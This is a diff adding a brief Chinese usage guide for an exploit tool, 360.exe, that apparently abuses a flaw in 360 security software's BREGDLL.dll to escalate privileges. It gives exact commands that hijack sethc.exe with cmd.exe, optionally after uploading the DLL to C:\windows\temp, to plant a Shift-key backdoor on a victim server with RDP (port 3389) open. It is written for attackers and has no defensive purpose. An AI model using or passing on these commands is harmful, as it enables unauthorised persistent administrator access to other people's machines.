@@ -1,0 +1,19 @@
+说下用法把
+
+usage:
+
+360.exe 要劫持的程序名 要运行的程序全路径 [BREGDLL.dll的全路径]
+
+解释一下吧：第三个参数BREGDLL.dll是可选参数，提供BREGDLL.dll这个文件的路径。因为有时候虽然漏洞没有被补上但360目录没有权限访问会导致提权失败。这时候就可以上传一个BREGDLL.dll到服务器上，然后把路径填到第三个参数那里。
+
+比如对方开了3389，那你就可以劫持sethc.exe 来做一个shift后门。
+
+360.exe "sethc.exe" "cmd.exe"
+
+如果360所在目录无权访问，那么我们就上传一个BREGDLL.dll到对方c:\windows\temp\BREGDLL.dll
+
+然后执行
+
+360.exe "sethc.exe" "cmd.exe" "c:\windows\temp\BREGDLL.dll"
+
+如果提示成功一个shift后门就被创建了，3389上去我就不说了。
